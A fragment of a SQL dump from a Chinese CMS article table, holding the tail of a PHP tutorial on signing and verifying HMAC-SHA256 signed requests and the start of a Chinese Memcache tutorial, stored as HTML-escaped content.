style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;strtoupper&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''algorithm''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;])&amp;nbsp;!==&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''HMAC-SHA256''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;die&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''Unknown&amp;nbsp;algorithm.&amp;nbsp;Expected&amp;nbsp;HMAC-SHA256''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;null;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//&amp;nbsp;check&amp;nbsp;sig&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$expected_sig&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;hash_hmac(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''sha256''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$payload&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$secret&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$raw&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;true);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$sig&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;!==&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$expected_sig&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;die&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''Bad&amp;nbsp;Signed&amp;nbsp;JSON&amp;nbsp;signature!''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;null;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//&amp;nbsp;解析&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;generateSignature(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$info&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$secret&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''4f5fcdc6514f7ee25ec4fa7c7853e8e1''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;base64UrlEncode(json_encode((&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$info&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)));&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$sign&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;hash_hmac(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''sha256''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$secret&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,true);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$signed_request&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;base64UrlEncode(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$sign&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;.&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;.&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$signed_request&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$info&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;array&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''algorithm''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;=&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''HMAC-SHA256''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;userId&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''aaa''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''userName''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''asdsad''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''sex''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''1''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;print_R(parseSignedRequest(generateSignature(&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$info&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)));&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;?&amp;gt; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302428451, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(43, 1, 'Memcache实用教程-php网站开发详解', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:arial, sans-serif, helvetica, tahoma;&quot;&gt;一、Memcache概述&amp;nbsp;&lt;br /&gt;\r\nMemcache是danga.com的一个开源项目，可以类比于MySQL这样的服务。memcached 是高效、快速的分布式内存对象缓存系统，主要用于加速 WEB 动态应用程序。&amp;nbsp;&lt;br /&gt;\r\n用自己的话说，memcache是一个服务器端软件，跟apache、mysql一样，也有自己的端口。维护一个存在于内存中的hash表。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;img src=&quot;http://dl.javaeye.com/upload/attachment/424410/86343e3d-6847-3a0e-8e99-b00f6dd8185b.png&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n二、Memcache工作原理&amp;nbsp;&lt;br /&gt;\r\n（1）初级&amp;nbsp;&lt;br /&gt;\r\n首先 memcached 是以守护程序方式运行于一个或多个服务器中，随时接受客户端的连接操作，客户端可以由各种语言编写，目前已知的客户端 API 包括 Perl/PHP/Python/Ruby/Java/C#/C 等等。客户端在与 memcached 服务建立连接之后，接下来的事情就是存取对象了，每个被存取的对象都有一个唯一的标识符 key，存取操作均通过这个 key 进行，保存到 memcached 中的对象实际上是放置内存中的，并不是保存在 cache 文件中的，这也是为什么 memcached 能够如此高效快速的原因。注意，这些对象并不是持久的，服务停止之后，里边的数据就会丢失。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n与许多 cache 工具类似，Memcached 的原理并不复杂。它采用了C/S的模式，在 server 端启动服务进程，在启动时可以指定监听的 ip，自己的端口号，所使用的内存大小等几个关键参数。一旦启动，服务就一直处于可用状态。Memcached 的目前版本是通过C实现，采用了单进程，单线程，异步I/O，基于事件 (event_based) 的服务方式.使用 libevent 作为事件通知实现。多个 Server 可以协同工作，但这些 Server 之间是没有任何通讯联系的，每个 Server 只是对自己的数据进行管理。Client 端通过指定 Server 端的 ip 地址(通过域名应该也可以)。需要缓存的对象或数据是以 key-&amp;gt;value 对的形式保存在Server端。key 的值通过 hash 进行转换，根据 hash 值把 value 传递到对应的具体的某个 Server 上。当需要获取对象数据时，也根据 key 